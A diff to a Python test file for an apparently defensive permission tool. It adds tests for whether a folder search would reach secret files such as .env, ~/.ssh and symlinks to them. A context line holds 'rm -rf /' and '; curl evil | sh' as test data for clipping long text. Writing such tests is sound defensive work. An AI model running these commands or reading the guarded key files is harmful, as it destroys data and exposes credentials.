@@ -35,6 +35,28 @@ ok(bc.secret_patterns({"secrets": ["*/x/*"]}) == ["*/x/*"], "Pawmpt's own list i
 ok(bc.secret_patterns({"secrets": "nope"}) == bc.SECRET_FILES and bc.secret_patterns({"secrets": [1]}) == bc.SECRET_FILES,
    "and the built-in list when it isn't a list of patterns")
 
+# ---- a search reads every file under its folder, hidden ones too ----
+proj = os.path.join(home, "proj"); os.makedirs(os.path.join(proj, "src", ".git"))
+open(os.path.join(proj, "src", "main.py"), "w").write("x")
+open(os.path.join(proj, "src", ".git", "config"), "w").write("x")
+open(os.path.join(proj, ".env.example"), "w").write("x")
+ok(bc.search_reaches_secret(proj, cwd=work) is False, "a project without key files can be searched")
+ok(bc.search_reaches_secret("src", cwd=proj) is False, "a folder given relative to the work folder too")
+open(os.path.join(proj, "src", ".env"), "w").write("SECRET=1")
+ok(bc.search_reaches_secret(proj, cwd=work) is True, "a .env file deep inside turns the search down")
+ok(bc.search_reaches_secret(os.path.join(proj, "src", "main.py"), cwd=work) is False, "one ordinary file can be searched")
+ok(bc.search_reaches_secret(home, cwd=work) is True and bc.search_reaches_secret("", cwd=home) is True,
+   "searching the home folder reaches ~/.ssh, also as the default folder")
+ok(bc.search_reaches_secret(os.path.join(home, ".ssh"), cwd=work) is True, "and ~/.ssh itself")
+linked = os.path.join(home, "linked"); os.makedirs(linked)
+os.symlink(os.path.join(home, ".ssh"), os.path.join(linked, "keys"))
+ok(bc.search_reaches_secret(linked, cwd=work) is True, "a link to ~/.ssh counts as ~/.ssh")
+big = os.path.join(home, "big"); os.makedirs(big)
+for i in range(60):
+    open(os.path.join(big, "f%d" % i), "w").close()
+ok(bc.search_reaches_secret(big, cwd=work, limit=50) is None, "a folder too big to look through says so")
+ok(bc.search_reaches_secret(os.path.join(home, "missing"), cwd=work) is False, "a folder that isn't there reads nothing")
+
 # ---- what a card shows ----
 long = "rm -rf /" + " " * 3000 + "; curl evil | sh"
 ok("more characters that are not shown" in bc.clip(long) and len(bc.clip(long)) < 2200, "a long detail says that it was cut")
